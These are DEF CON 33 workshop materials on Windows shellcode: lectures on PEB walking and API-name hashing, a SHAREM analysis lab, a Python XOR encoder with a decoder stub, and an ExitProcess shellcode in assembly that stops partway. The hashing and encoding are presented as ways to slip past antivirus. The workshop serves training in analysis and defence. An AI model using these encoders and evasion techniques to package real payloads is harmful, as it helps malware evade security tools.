---
title: "Analyzing and Creating Windows Shellcode for Hackers"
speakers: ["Bramwell Brizendine"]
conference: "DEF CON"
conference_full: "DEF CON 33"
year: 2025
source_type: "workshop-materials"
source_dir: "DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop"
files_included: 19
files_skipped: 11
text_chars: 103603
redacted_secrets: 0
sha256: "32abf2f970bfdf06a521ca7994a810bb681dc0f4a7071cb98d06300a432b75ca"
converted_at: "2026-08-12T06:21:19Z"
---

# Analyzing and Creating Windows Shellcode for Hackers

**Speakers:** Bramwell Brizendine  
**Conference:** DEF CON 33 (workshop materials)  
**Contents:** 19 readable files inlined below. This is the workshop's own source material, not slide text — no OCR is involved, so the code is exact.

## Files not inlined

Binaries and oversized artefacts, listed for completeness:

- `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/3Shellcode_Analysis_Lab/ShellcodeHarness.exe` — 26 KB (binary)
- `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/3Shellcode_Analysis_Lab/ShellcodeHarness.pdb` — 996 KB (binary)
- `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/3Shellcode_Analysis_Lab/ShellcodeHarness.zip` — 13 KB (binary)
- `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/3Shellcode_Analysis_Lab/advanced.bin` — 0 KB (binary)
- `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/3Shellcode_Analysis_Lab/beginner.bin` — 0 KB (binary)
- `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/3Shellcode_Analysis_Lab/intermediate.bin` — 0 KB (binary)
- `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/4Rolling_Your_Own_Shellcode/ShellcodeHarness.pdb` — 996 KB (binary)
- `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/4Rolling_Your_Own_Shellcode/ShellcodeHarness.zip` — 13 KB (binary)
- `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/LabGuide.pdf` — 291 KB (binary)
- `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/Lecture.pdf` — 200 KB (binary)
- `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/shellcode_workshop_slides.pdf` — 11449 KB (binary)

## Materials

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/1Assembly_Review/lecture.md`

```markdown
# Assembly Review

To be provided by another instructor.
```

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/2Windows_Internals/WinAPIHash.py`

```python
import sys
import argparse

def hash(key, name):
    hash_value = 0
    for c in name:
        hash_value = (hash_value + c) & 0xFFFFFFFF
        hash_value = (hash_value << 4) & 0xFFFFFFFF
    return (hash_value ^ key) & 0xFFFFFFFF

def main():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-k", "--key", default="0x12345678", help="Specify a hexadecimal DWORD to use for the key.")
    arg_parser.add_argument("-f", "--function", default="VirtualAlloc", help="Specify the Windows API function name to hash.")
    arg_parser.add_argument("-w", "--wide", default=False, action='store_true', help="Convert Windows API function name to wide char before hashing.")
    args = arg_parser.parse_args()
    hash_key = int(args.key, 16)
    print(f"hash_key: {hash_key}")
    if(args.wide):
        windows_api_string = b"".join([c.encode()+b'\x00' for c in args.function])
    else:
        windows_api_string = args.function.encode()
    print(windows_api_string)
    print(f"0x{hash(hash_key, windows_api_string):x}\n")

if __name__ == "__main__":
    main()
```

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/2Windows_Internals/lecture.md`

````markdown
# Windows Internals Crash Course

## Windows Internals

Windows internals is a large and complex body of knowledge. We'll review the basics of this complex subject but, it can be an active area of practical research, technique development, and consistent learning for even the most advanced cyber security practitioners.

### User Mode vs. Kernel Mode

The Windows operating system is split into two distinct modes, User Mode and Kernel Mode. Most people and developers will remain in User Mode and have no need to directly interact with the kernel. The programs that you most commonly interact with are in User Mode. Think of your browsers, the calcualator, word processors, Integrated Development Environments (IDEs), etc; these are all in User Mode.

Kernel Mode is the most privileged area of the operating system and handle all of the complex processing that most users do not want to think about. The kernel handles memory management, file access, interacting with hardware, execution scheduling, and more. The Windows kernel is located in the NTOSKRNL.exe file. This is loaded shortly after the computer powers on while the system is completing the boot process.

These two modes are implemented as two sides of a strict security boundary to protect users from malicious capabilities and sometimes even themeselves. Learning about both will give a better picture of how a cyber security practitioner can both attack and defend this operating system.

### Process, Threads, and Scheduling

One of the foundational components of the Windows operating system is the concept of processes and threads. A process is a logical collection of information, including executable code, that comprises a running program. This process has large amounts of information that allow the operating system to provide the resources needed to execute the program. Within each process, there are one, or many, threads executing. Each thread also contains a lot of information about the code being executed but is isolated to only that thread. Each thread only knows about itself and does not worry about other threads running within the same process.

The kernel uses a "scheduler" to start, pause, and stop executing threads. When a thread starts, it's given a specific amount of time to execute before the operating system pauses it, saves off information, and let's another thread execute. This scheduling gives the illusion of a system that can run multiple programs simultaneously. While modern hardware may have multiple cores, which will allow for true multiprocessing, even a single core CPU can give the illusion of the operating system running multiple programs at the same time simply by efficiently executing, pausing, and running a sequence of threads.

### Memory Management

Computer memory is foundational to the computer as a system, not just an operating system or software. Any computer must have space to store its information. Executable code and data are all stored in memory so the computer can execute instructions with data. While simple in concept, the impelemntation can become quite complex when considering physical memory and virtual memory in a modern operating system. Luckily, the kernel handles this for us and when a program needs memory for its operation, it can request it from the operating system and the operating system will prepare the memory for usage by the program.

Since there has been a rise in exploitation attempts against the Windows operating system overtime, Microsoft, along with its partners, have implemented memory security protections including DEP, ASLR, which are critical to understand for binary exploitation on the Windows operating system.

### Windows Registry

One more critical component of the Windows operating system is the Windows Registry. This is used throughout the operating system for a variety of use cases including system settings, process settings, display settings, security settings, enterprise configurations, forensics, and even more. It is also used by both User Mode and Kernel mode applications.

### Windows API Calls

Combining all of these ideas together, users and developers need a safe way to interact with the kernel in order to run programs using hardware, graphics, memory, etc. This brings us to the Windows API. Each program calls exported functions by a variety of dynamically linked library (.DLL) files in order to securely interact with the operating system. There are DLLs that are used in every program, some that are linked dynamically when the program is loaded by the operating system, and some that a developer can dynamically load themselves for unique purposes. These allow for users and developers to correctly and securely use the operating system to its full potential and arrive at the user experience that we are all familiar with on the Windows operating system.

Some examples of functions include VirtualAlloc, CreateFile, CreateProcess, LoadLibrary, GetProcAddress, and so many more. As you learn more, you'll even learn that these are abstracted away from the system calls that actually cause the low-level interrupt and mode change between User Mode and Kernel Mode. We will talk more about system calls later in this course.

## PE File vs. Shellcode

### PE File

The Portable Executable (PE) file structure is well-documented and understanding this structured format for a program is critical to understanding how the Windows operating system works. One of the best resources to learn about Windows internals is the documentation provided by Microsoft called MSDN.

### Format

Microsoft published a large page on the PE format located [[https://learn.microsoft.com/en-us/windows/win32/debug/pe-format]]. We'll walk through some of the sections and components of the format. The first three major sections of the PE file are the DOS Header, the COFF/PE Header, and the Optional Header.

#### DOS Header

This is a small header at the beginning of every PE file. You'll likely recognize it from the "MZ" characters or the "This program cannot be run in DOS mode" string that exists in this header. At location 0x3C in the DOS header, one can find the offset to the PE Header.

#### PE Header

The PE Header contains much more information that Windows uses when loading the program into memory. It contains information like the architecture of the binary, the number of sections with in the PE file, and characteristics of the PE File which include a flag to determine if the PE file is an executable (.EXE) or a dynamically linked library (.DLL).

#### Optional Header

The Optional Header is not optional as it contains critical and valuable information about the PE file used by the Windows operating system to load the program. Fields like the size and location of important sections within the PE file, the offset of the Original Entry Point (OEP), process values such as the default size of the stack, a checksum, and even more data.

### Data Directories

The data directories will be especially useful to us in this course as we will routinely interact with the Export Address Table (EAT) in order to dynamically resolve virtual addresses of functions in memory so we can use them with our shellcode. Other data directories exist such as the Import Table, Resource Table, the Import Address Table, and the base relocation table. There are many more data directories that deserve their own time for reserach and understanding that will not be provided in this course.

## PEB 

Now that we have a basic understanding of Windows internals, let's move towards our objective of understanding and writing shellcode. This starts with understanding the Process Environment Block (PEB) structure. Microsoft has published a version of this structure on MSDN, [[https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb]], but we can get an even more detailed one by using a debugging tool, such as WinDBG, to download the symbols from microsoft and view them within the debugger. We will see this later in the course when we get to analyzing shellcode.

There are also many other blogs and posts that talk about the PEB structure and individual practitioners have documented fields that microsoft has not made public. Given that this structure is not guaranteed to be the same across operating system versions, it's important to understand this structure and how and where it's used as part of the Windows operating system and the execution and maintenance of a process object.

For shellcode, we will need to "walk the PEB" or "traverse the PEB" in order to find exported functions located in other DLLs that are loaded into memory. The reason we need to walk the PEB for this is that each process keeps lists of DLLs that are loaded into memory for each process. Each of these lists hold the same information but the ordering is different and can be used to our advantage when locating specific functions within specific DLLs we know are guaranteed to exist.

First, we need to know how to find the PEB. The way the Windows operating system is implemented, Windows places a critical structure in the `fs` register. This data structure is called the Thread Environment Block (TEB). It contains information necessary for the execution of the thread. One of the members of the TEB is a pointer to the PEB. For 32-bit, it's offset 0x30. We can access it like this:

```asm
mov EAX, fs:[0x30]
```

The `EAX` register now contains a pointer to the PEB. We can now use this in our shellcode to start walking the PEB.

We first look at the Ldr member of the PEB. This member is of type PPEB_LDR_DATA, or in english, a pointer to a PEB_LDR_DATA structure. This structure is also semi-documented on MSDN, [[https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data]]. We can only see here the InMemoryOrderModuleList. This is one of the lists that contains a list of the loaded DLLs in memory. There are actually two other lists that are part of the PVOID Reserved2[3] member. These are called InLoadOrderList and InInitializationOrderList. You may also see it with "Link" instead of "List" for the named members. These pointers point to a doubly linked list of LDR_DATA_TABLE_ENTRY structs. This struct is also documented on the same page as the PEB_LDR_DATA structure.

The LDR_DATA_TABLE_ENTRY contains lots of valuable information about each DLL that is loaded into memory including the base address and the DLL Name. We will use this information to functionally implement the LoadLibrary Windows API call. The LoadLibrary API call takes in a file name or path to a DLL and loads it into memory for the program to use. Often this is the virtual address of the DLL image in memory and specifically for our implementation it will definitely be the base address of the DLL.

From this point, we need to implement our own version of GetProcAddress. The GetProcAddress API call takes in a DLL and a string that is the function name to resolve and returns the virtual address of the function. So for example, calling GetProcAddress(pKernel32, "MessageBoxA"), where pKernel32 is the base address of Kernel32.dll in memory, it will reutrn the address of the function MessageBoxA so it can be used within the program.

To do this, we will walk the PEB to find the base address of the DLL we need to resolve a function from. Once we have that address, we walk the PE File using our knowledge of the structure to find the Export Address Table (EAT). Each member of the EAT contains a pointer to the name of the function. We can iterate through the table looking for the function name that matches the function name we are looking for. Once we find it, we use that index to look up the ordinal of the function being exported. The ordinal is the index in the function address component of the EAT member which will allow use to compute the function address of our desired routine. We can now call this address for this function like we would with any other function since it has been resolved.

## GetProcAddress Hashing Techniques

Expanding on our LoadLibrary and GetProcAddress implementation, we need to consider the ability for Anti-virus and security protection mechanisms to hinder our shellcode. Including the string "CreateProcessA" is much more suspicious than a random series of bytes which could mean the same thing. In fact, we can use this idea to implement our own hashing algorithm to obfuscate the functions we are interested in and still resolve it correctly.

We will actually practice this in an upcoming lab! The idea goes as follows. If we take our function name string and apply a hashing function to it to produce a unique number then when we are resolving functions we can apply the same hashing function to each function string we are searching through. If we find a function where the hashes match, we have found our function, and no strings are present in our shellcode.

## Get Program Counter (PC) Techniques

One last thing before we go to our lab, we need to talk about getting the Program Counter, or instruction pointer, value. Basically, how do we know where we are executing in memory? There is a common trick using the CALL/POP instructions to locate oneself in memory. The way it works is this. When the shellcode starts, the first instruction is a CALL instruction to the next instruction. As part of the CALL instruction, the return address is pushed onto the stack. The return address in this case is the next instruction so the address of current instruction is located on the stack. We can then pop this value from the stack and we have our current instruction address in a register to be used as we need for our shellcode.

```asm
call get_pc
get_pc:
  pop eax  ; EAX now has our current instruction address
```

## Hashing Technique Demo

Now we're going to use the provided WinApiHash.py script that has a simple Windows API function name hashing algorithm implemented within it. It also takes a key to make the hash more unique. The key can be changed as part of the shellcode to prevent null bytes, signatures, bad characters without even changing the algorithm. If it comes to it, the algorithm could be switched up as well by modifying the hashing operations done to compute it. Feel free to experiement with the code and generate hashes.

Keep in mind, this hashing also will have to be implemented in shellcode to resolve to the same value, so making it too complicated can have negative effects on the implementation of your shellcode.

Now it's your turn, give some of these a try and use MSDN to look up other functions to play around with the API hashing.
Try:

- Key: 0xabcd1234, Name: VirtualAlloc
- Key: 0xabcd1235, Name: VirtualAlloc
- Key: 0x11111111, Name: CreateFileA
- Key: 0x1F1F1F1F, Name: LoadLibraryW
````

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/3Shellcode_Analysis_Lab/lab.md`

````markdown
# Shellcode Analysis Lab

## Installing SHAREM

- Make sure you have `git` installed on your Windows machine. Instructions to install git are located on the SHAREM Github page.
  - [SHAREM Github](https://github.com/Bw3ll/sharem)
- Create python virtual environment so the dependencies do not alter your system python settings
  - `python -m venv sharem_venv`
- Activate the python virtual environment
  - `sharem_venv\Scripts\activate.bat`
- Clone the SHAREM repository
  - `git clone https://github.com/Bw3ll/sharem`
- Enter SHAREM directory
  - `cd sharem`
- Checkout a specific revision
  - `git checkout 091b9bff64cd8b04a49ae038dd3cefc422904da0`
- Install (part 1)
  - `python -m pip install .\sharem`
- Execute the Alternate Windows installer .bat
  - `cd .\installers`
  - `Windows_installer_alternate.bat`
- Confirm SHAREM is installed
  - `cd ..`
  - `python main.py`
  - You're looking for the usage menu

```bash
usage: Sharem [-h] (-pe PE | -r R | -r64 R64 | -r32 R32 | -d D) [-c C]
Sharem: error: one of the arguments -pe -r -r64 -r32 -d is required
```

## Opening Shellcode in a Debugger

0. If you do not have Python, NASM, or a debugger (WinDBG or x32dbg) installed, please do so now

1. Open up your debugger of choice, WinDBG or x32Dbg, with the target program being the shellcode harness

2. Run the Shellcode harness with the beginner32.bin

![](./images/labs/shellcode_analysis_lab_windbg_open_harness.png)

3. Execute `.reload /f` in Windbg to load the ShellcodeHarness.pdb file which gives symbols for the harness

4. Set a breakpoint on the run() function

- `bp ShellcodeHarness!run`
- When the breakpoint is successfully set, execute `g` to run the code until it hits the breakpoint.

![](./images/labs/shellcode_analysis_lab_windbg_run_to_breakpoint.png)

5. Step through the execution and see if you can find the PEB, the dynamic resolution of kernel32.dll, and the dynamic resolution of two other functions in this shellcode sample.

- Often modules are page-aligned (ends with 000) and functions are 16-byte aligned (ends with 0)

## Using SHAREM for Shellcode Analysis

1. Load the same .bin in Sharem and let it conduct it's analysis. How much faster did this get you the information you needed? Was all the same information accurate from your manual analysis with the debugger?

2. Use the `z` command to have SHAREM do a full analysis of beginner.bin

3. USe the `D` command to display the disassembly for beginner.bin

4. How much faster did this get you the information you needed? Was all the same information accurate from your manual analysis with the debugger? We will review after the lab to see if you were correct!

## Repeat for Intermediate and Advanced Samples

1. Repeat these steps for intermediate and advanced shellcode samples and see how much easier using SHAREM can be than manually analyzing shellcode.

2. When you're finished, are there any cases where doing manual analysis may still be necesssary or useful?

\pagebreak
````

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/4Rolling_Your_Own_Shellcode/XOREncode.py`

```python
import sys
import random

XOR_DECODER_STUB = bytes([
    0xEB, 0x03, 0x5A, 0xEB, 0x05, 0xE8, 0xF8, 0xFF, 0xFF, 0xFF, 0x30, 0xD2, 0xEB, 0x1B, 0x5B, 0x31, 
    0xC9, 0xB9, 0xCC, 0xDD, 0xEE, 0xFF, 0x81, 0xF1, 0xDD, 0xCC, 0xBB, 0xAA, 0x31, 0xC0, 0x80, 0x33, 
    0xAA, 0x43, 0x40, 0x39, 0xC8, 0x7C, 0xF7, 0xEB, 0x05, 0xE8, 0xE0, 0xFF, 0xFF, 0xFF
])

def main():

    # First, we want to take the first argument, which will be
    # a path to the shellcode, and read in the binary data
    with open(sys.argv[1], "rb") as f:
        data = f.read()

    # Next we want to find the first least byte that is not
    # used in the shellcode and use that as our key.
    # This works because creating a set from the data
    # list deduplicates all bytes and we get a unique list
    # of the bytes that are used. If there are less than
    # 256 unique bytes, at least one was not used.
    data_set = set(data)
    if len(data_set) < 256:
        while True:
            key = random.randint(0,255)
            if key not in data_set:
                break
    else:
        print("[!] All bytes are used, this encoding cannot be null-free.")
        key = random.randomint(0,255)
    
    print(f"Key selected: 0x{key:x}\n")
    
    # Now we want to encode all the bytes.
    encoded_data = []
    for b in data:
        encoded_data.append(b^key)

    print(f"Encoded Data (size: {len(encoded_data)}):")
    print(f"{bytes(encoded_data)}\n")

    # Remember, the size needs to be XORd with a DWORD key
    # that is null free and then placed in the XOR_DECODER_STUB
    encoded_data_size = len(encoded_data)
    while True:
        size_key = random.randint(0, 2**32-1) 
        size_constant = size_key ^ encoded_data_size
        size_constant_bytes = size_constant.to_bytes(4, 'little')
        if 0 not in size_constant_bytes:
            break
    print(f"Size Key: 0x{size_key:x}")
    print(f"Size Key Bytes: {size_key.to_bytes(4,'little')}")
    print(f"Size Constant: 0x{size_constant:x}")
    print(f"Size Constant Bytes: {size_constant_bytes}\n")

    size_constant_instruction = b'\xb9'+size_constant_bytes
    modified_xor_decoder_stub = XOR_DECODER_STUB.replace(b'\xb9\xcc\xdd\xee\xff', size_constant_instruction)

    size_xor_instruction = b'\x81\xf1'+size_key.to_bytes(4, 'little')
    modified_xor_decoder_stub = modified_xor_decoder_stub.replace(b'\x81\xf1\xdd\xcc\xbb\xaa', size_xor_instruction)

    xor_decoding_instruction = b'\x80\x33' + key.to_bytes(1, 'little')
    modified_xor_decoder_stub = modified_xor_decoder_stub.replace(b'\x80\x33\xaa', xor_decoding_instruction)

    print("Compare XOR Decoder Stubs:")
    print(f"Before: {XOR_DECODER_STUB!r}\nAfter: {modified_xor_decoder_stub!r}\n")

    final_shellcode = modified_xor_decoder_stub + bytes(encoded_data)
    print(f"Final Shellcode (size: {len(final_shellcode)}):")
    print(f"{final_shellcode}\n")

    with open("xor_encoded_shellcode.bin","w+b") as f:
        f.write(final_shellcode)


if __name__ == "__main__":
    main()
```

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/4Rolling_Your_Own_Shellcode/XOREncode_skeleton.py`

```python
import sys
import random

# TODO
XOR_DECODER_STUB = bytes()

def main():

    # First, we want to take the first argument, which will be
    # a path to the shellcode, and read in the binary data
    with open(sys.argv[1], "rb") as f:
        data = f.read()

    # Next we want to find a byte that is not
    # used in the shellcode and use that as our key.
    # This works because creating a set from the data
    # list deduplicates all bytes and we get a unique list
    # of the bytes that are used. If there are less than
    # 256 unique bytes, at least one was not used.
    data_set = set(data)
    if len(data_set) < 256:
        while True:
            key = random.randint(0,255)
            if key not in data_set:
                break
    else:
        print("[!] All bytes are used, this encoding cannot be null-free.")
        key = random.randomint(0,255)
    
    print(f"Key selected: 0x{key:x}\n")
    
    # Now we want to encode all the bytes.
    encoded_data = []
    for b in data:
        # TODO - Individually XOR key with bytes here
        pass

    print(f"Encoded Data (size: {len(encoded_data)}):")
    print(bytes(encoded_data))
    print()

    # Remember, the size needs to be XORd with a DWORD key
    # that is null free and then placed in the XOR_DECODER_STUB
    # OR
    # Handle the size of the shellcode however you would like
    # TODO

    final_shellcode = XOR_DECODER_STUB + bytes(encoded_data)
    print(f"Final Shellcode (size: {len(final_shellcode)}):")
    print(final_shellcode)

    with open("xor_encoded_shellcode.bin","w+b") as f:
        f.write(final_shellcode)


    

if __name__ == "__main__":
    main()
```

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/4Rolling_Your_Own_Shellcode/exitprocess32.asm`

```asm
; Assemble: nasm -o exitprocess32.bin exitprocess32.asm
BITS 32  ; Set to 32-bit mode

SECTION .text

global _start

_start:
; --- Shellcode Start ---
; --- 0. Get current location ---
call get_eip
get_eip:
    POP EDX  ; For now, EDX holds the starting location of shellcode
    SUB EDX, 0x5  ; Set EDX to beginning of shellcode

; --- 1. Get the address of the PEB ---
; In 32-bit Windows, the PEB is typically pointed to by FS:[0x30].
MOV EAX, FS:[0x30] ; EAX = Address of the PEB

; --- 2. Traverse the PEB's module list to find kernel32.dll ---
; PEB structure (simplified):
; +0x00 ...
; +0x0C Ldr (Pointer to PEB_LDR_DATA)
; ...
; PEB_LDR_DATA structure (simplified):
; +0x0C InLoadOrderModuleList (LIST_ENTRY) - This list is often used
; +0x14 InMemoryOrderModuleList (LIST_ENTRY)
; +0x1C InInitializationOrderModuleList (LIST_ENTRY)
; ...
; LDR_DATA_TABLE_ENTRY structure (simplified):
; +0x00 InLoadOrderLinks (LIST_ENTRY)
; +0x08 InMemoryOrderLinks (LIST_ENTRY)
; +0x10 InInitializationOrderLinks (LIST_ENTRY)
; +0x18 DllBase (Base address of the module)
; +0x2C BaseDllName (UNICODE_STRING structure) - Pointer to module name

MOV EAX, [EAX + 0x0C] ; EAX = Address of PEB_LDR_DATA (PEB->Ldr)

; We'll use the InMemoryOrderModuleList (offset 0x14 from PEB_LDR_DATA).
; The LIST_ENTRY structure has Flink (ForwardLink) and Blink (BackwardLink) pointers.
; The first entry after the list head is the first module (usually the main EXE).
; The second entry is typically ntdll.dll, the third is kernel32.dll.
MOV EAX, [EAX + 0x14] ; EAX = Address of the InMemoryOrderModuleList LIST_ENTRY (list head)
MOV ECX, EAX          ; ECX = Pointer to the list head for comparison later

; Get the address of the first entry (the EXE itself)
MOV ESI, [EAX]        ; ESI = Flink of the list head (first LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks)

; Start loop to walk the list
find_kernel32_loop:
  ; Check if we've wrapped around to the list head (end of list)
  CMP ESI, ECX
  JE end_of_module_list ; If ESI equals ECX, we've checked all modules

  ; ESI currently points to the InMemoryOrderLinks field (offset 0x08)
  ; of the LDR_DATA_TABLE_ENTRY.
  ; To get the base address and name, we need the base address of the LDR_DATA_TABLE_ENTRY.
  ; The InMemoryOrderLinks field is at offset +0x08 within the LDR_DATA_TABLE_ENTRY.
  ; So, Base address of entry = ESI - 0x08
  PUSH ESI            ; Save ESI (points to InMemoryOrderLinks)
  SUB ESI, 0x08       ; ESI = Base address of the current LDR_DATA_TABLE_ENTRY

  ; Get the module base address
  MOV EBX, [ESI + 0x18] ; EBX = DllBase (Module base address)

  ; Get the UNICODE_STRING structure for the module name
  LEA EDI, [ESI + 0x2C] ; EDI = Address of UNICODE_STRING structure (BaseDllName)
  ; The UNICODE_STRING structure (simplified):
  ; +0x00 Length
  ; +0x02 MaximumLength
  ; +0x04 Buffer (Pointer to the wide character string)

  MOV EDI, [EDI + 0x04] ; EDI = Pointer to the module name wide string (BaseDllName.Buffer)

  ; This is where string comparison logic goes.
  ; In real shellcode, this would be an assembly routine
  ; comparing the wide string at EDI with a hardcoded hash
  ; of "kernel32.dll" or doing a manual character-by-character
  ; comparison avoiding null bytes.
  PUSH EDI  ; Save EDI
  PUSH ESI  ; Save ESI
  PUSH ECX  ; Save ECX
  MOV ECX, 0xd  ; Move length of string into ECX for REP CMPSW instruction

  ; We are going to use the `repe cmpsw` instruction to compare our kernel32 string
  ; with the one in the buffer. If they are not equal we continue the loop, otherwise
  ; we found the module. We use the W variant because kernel32 is a wide char.
  LEA ESI, [string_kernel32_dll]
  ADD ESI, EDX  ; Get memory correct location of kernel32 string
  REPE CMPSW
  je found_kernel32  ; If the strings were equal, we found it, otherwise reset and try again

  POP ECX  ; Restore saved value
  POP ESI  ; Restore saved value
  POP EDI  ; Restore saved value
  POP ESI              ; Restore ESI (get back the Flink pointer)
  MOV ESI, [ESI]       ; ESI = Flink to the next entry in the list
  JMP find_kernel32_loop ; Continue loop

end_of_module_list:
  ; Handle case where kernel32.dll was not found (shellcode should probably exit)
  JMP shellcode_exit_failure ; Example exit path

found_kernel32:
  ; EBX now holds the base address of kernel32.dll
  POP ECX  ; restore saved value
  POP ESI  ; Restore saved value
  POP EDI  ; Restore saved value

  ; --- 3. Parse the PE headers of kernel32.dll to find the Export Directory ---
  ; MZ Header: +0x3C points to the PE Header (NT Headers) offset (e_lfanew)
  MOV EAX, [EBX + 0x3C]   ; EAX = RVA of NT Headers (PE Signature)
  ADD EAX, EBX            ; EAX = Address of NT Headers (PE Signature)

  ; NT Headers (simplified):
  ; +0x00 Signature ("PE\0\0")
  ; +0x04 IMAGE_FILE_HEADER
  ; +0x18 IMAGE_OPTIONAL_HEADER32 (Offset varies for 64-bit)
  ; ...
  ; IMAGE_OPTIONAL_HEADER32 (simplified):
  ; ...
  ; +0x78 DataDirectory (IMAGE_DATA_DIRECTORY array, size 16) - Offset 0x78 for 32-bit
  ; ...
  ; IMAGE_DATA_DIRECTORY structure:
  ; +0x00 VirtualAddress (RVA of the data structure)
  ; +0x04 Size

  ; Access the Optional Header (offset 0x18 from NT Headers + Signature size 4 = 0x1C)
  ; ADD EAX, 0x1C           ; EAX = Address of the IMAGE_OPTIONAL_HEADER32

  ; Access the Data Directory array (offset 0x78 from start of Optional Header32)
  ADD EAX, 0x78           ; EAX = Address of the DataDirectory array

  ; The Export Directory is the first entry in the Data Directory array (index 0)
  MOV ESI, [EAX]          ; ESI = RVA of the Export Directory
  ADD ESI, EBX            ; ESI = Address of the Export Directory structure

  ; Export Directory structure (simplified):
  ; ...
  ; +0x14 NumberOfNames (Number of exported functions with names)
  ; +0x1C AddressOfFunctions (RVA of Export Address Table - EAT)
  ; +0x20 AddressOfNames (RVA of Export Name Pointer Table - ENPT)
  ; +0x24 AddressOfNameOrdinals (RVA of Export Ordinal Table - EOT)
  ; ...

  ; Store EAX so we can use it to hold shellcode base
  PUSH EAX
  MOV EAX, EDX

  ; Get pointers to the key tables
  MOV EDI, [ESI + 0x20] ; EDI = RVA of AddressOfNames (ENPT)
  ADD EDI, EBX          ; EDI = Address of the ENPT (Array of RVAs of function names)

  MOV EBP, [ESI + 0x24] ; EBP = RVA of AddressOfNameOrdinals (EOT)
  ADD EBP, EBX          ; EBP = Address of the EOT (Array of WORDs - ordinals)
  
  MOV EDX, [ESI + 0x1C] ; EDX = RVA of AddressOfFunctions (EAT)
  ADD EDX, EBX          ; EDX = Address of the EAT (Array of DWORDs - functions)

  ; Get the number of named exports
  MOV ECX, [ESI + 0x14] ; ECX = NumberOfNames


  ; --- 4. Walk the Export Name Pointer Table to find GetProcAddress ---
  ; We need to iterate through the names and compare them to "GetProcAddress".

  find_GetProcAddress_loop:
    ; Check if we have iterated through all named exports
    DEC ECX               ; Decrement name counter
    JL end_of_GetProcAddress_loop ; If counter < 0, exit loop

    ; Get the RVA of the current function name string from the ENPT
    MOV ESI, [EDI + ECX * 4] ; ESI = RVA of the current function name string
    ADD ESI, EBX             ; ESI = Address of the current function name string

    ; --- Compare the string at ESI with "GetProcAddress" ---
    ; This is another string comparison routine.
    PUSH EDI  ; Save EDI
    PUSH ECX  ; Save number of function names
    MOV ECX, 0xe  ; Length of GetProcAddres
    LEA EDI, string_getprocaddress
    ADD EDI, EAX  ; EAX holds shellcode base for now 
    REPE CMPSB
    JE found_GetProcAddress  ; If the strings were equal, we found it, otherwise reset and try again
    POP ECX  ; Restore ECX
    POP EDI  ; Restore EDI

    ; If no match, continue loop
    JMP find_GetProcAddress_loop

  end_of_GetProcAddress_loop:
    ; Handle case where GetProcAddress was not found
    JMP shellcode_exit_failure ; Example exit path

  found_GetProcAddress:
    POP ECX  ; Restore index of GetProcAddress
    POP EDI  ; Restore EDI from string comparison
    POP EAX  ; Restore EAX from before and reset stack

    ; ECX holds the index of "GetProcAddress" from the successful comparison
    ; Use this index to find the ordinal
    MOVZX ECX, WORD [EBP + ECX * 2] ; ECX = Ordinal (ordinals array is WORDs)

    ; Use the ordinal to find the function RVA in the EAT
    MOV EAX, [EDX + ECX * 4] ; EAX = RVA of the function (EAT is DWORDs)

    ; Calculate the absolute address of GetProcAddress
    ADD EAX, EBX             ; EAX = Address of GetProcAddress
    MOV EDI, EAX             ; EDI now holds the address of GetProcAddress

  ; --- 5. Use the found address of GetProcAddress to find ExitProcess ---
  ; Now we can call GetProcAddress(hModule, lpProcName)
  ; Arguments are pushed onto the stack right-to-left (stdcall/cdecl compatible for a few args)

  ; Prepare arguments for GetProcAddress("kernel32.dll", "ExitProcess")
  ; Push the function name "ExitProcess" (as a string or hash ID)

  ; Example of pushing characters onto the stack to form "ExitProcess\x00":
  PUSH DWORD 0x00737365 ; "\0sse"
  PUSH DWORD 0x636F7250 ; "corP"
  PUSH DWORD 0x74697845 ; "tixE"
  MOV ESI, ESP     ; ESI = Pointer to "ExitProcess" string on stack

  ; Push the pointer to the function name string
  PUSH ESI         ; Push lpProcName (pointer to "ExitProcess")
  
  ; Push kernel32.dll base address
  PUSH EBX         ; Push hModule (kernel32.dll base address is in EBX)

  ; Call GetProcAddress
  CALL EDI         ; Call the address stored in EDI (GetProcAddress)

  ; EAX now holds the address of ExitProcess

  ; --- Call ExitProcess ---
  ; ExitProcess takes one argument: uExitCode (DWORD)
  PUSH 0           ; Push exit code 0

  ; Call ExitProcess (address is in EAX)
  CALL EAX         ; Call the address stored in EAX (ExitProcess)


shellcode_exit_failure:
  ; Code to indicate failure, EAX=1
  XOR EAX, EAX
